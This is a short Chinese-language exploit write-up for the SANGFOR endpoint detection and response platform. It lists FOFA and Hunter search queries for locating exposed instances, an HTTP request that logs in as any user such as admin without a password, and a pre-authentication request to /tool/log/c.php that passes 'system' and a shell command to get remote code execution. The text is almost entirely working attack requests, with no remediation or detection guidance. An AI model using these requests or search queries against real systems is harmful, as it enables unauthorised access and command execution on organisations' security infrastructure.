## SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE

## FOFA语法
```
title="SANGFOR终端检测响应平台"
icon_hash="1307354852"
```
##  鹰图搜索
```
web.title="SANGFOR终端检测响应平台"
web.icon=="68e28d49856759ddeb91b6be3d6f7e42"
```

## 漏洞复现
路由后拼接/ui/login.php?user={{需要登录的用户名}}

这边以admin权限用户为例
```
GET /ui/login.php?user=admin HTTP/1.1

Host: {{Hostname}}
```

## 前台RCE
```
GET /tool/log/c.php?strip_slashes=system&host=id HTTP/1.1

Host: {{Hostname}}
```
